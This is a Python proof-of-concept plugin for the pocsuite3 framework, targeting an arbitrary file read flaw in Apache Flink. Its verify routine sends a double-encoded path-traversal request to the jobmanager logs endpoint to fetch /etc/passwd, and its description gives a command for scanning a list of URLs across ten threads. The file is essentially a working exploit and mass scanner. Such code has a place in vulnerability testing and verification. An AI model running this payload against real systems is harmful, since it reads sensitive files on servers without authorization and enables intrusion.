from pocsuite3.api import PluginBase,Output,POCBase
from urllib.parse import urljoin
from pocsuite3.api import PLUGIN_TYPE,REVERSE_PAYLOAD
from pocsuite3.api import logger,requests,get_listener_ip,get_listener_port
from pocsuite3.api import register_poc
import json
class Apache_Flink_File_Read(POCBase):
    category = PLUGIN_TYPE.POCS
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    author = 'srat1999' #  PoC作者的大名
    vulDate = '2021-1-6' #漏洞公开的时间,不知道就写今天
    createDate = '2020-1-6'# 编写 PoC 的日期
    updateDate = '2020-1-6'# PoC 更新的时间,默认和编写时间一样
    name = 'Apache-Flink 任意文件读取'# PoC 名称
    # appPowerLink = 'https://www.drupal.org/'# 漏洞厂商主页地址
    appName = 'Apache-Flink'# 漏洞应用名称
    appVersion = '1.11.0-2'# 漏洞影响版本
    # vulType = 'SQL Injection'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        python cli.py -r pocs/Apache_Flink_File_Read.py --url-file urls.txt --threads 10
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
        # pocDesc = ''' '''
    def init(self):
        pass
    def _verify(self):
        result = {}
        path = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
        url = urljoin(self.url,path)
        try:
            resp = requests.get(url,timeout=5)
            content = resp.text
            if "root" in content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except Exception as e:
            logger.warning(e)
        return self.parse_output(result)
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(Apache_Flink_File_Read)
